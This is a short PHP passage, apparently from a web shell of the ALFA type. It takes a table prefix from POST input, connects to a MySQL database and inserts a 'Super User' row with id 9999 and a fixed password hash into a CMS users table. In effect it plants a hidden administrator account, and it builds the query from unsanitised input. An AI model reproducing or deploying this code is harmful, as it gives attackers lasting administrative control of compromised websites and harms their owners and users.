...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password,registerDate) values(9999,'Super User','".$admin."','".$SQL."','7e3822c5a128255b96fb550a87845673','2020-02-02 09:29:56')") or die(mysqli_error($conn));
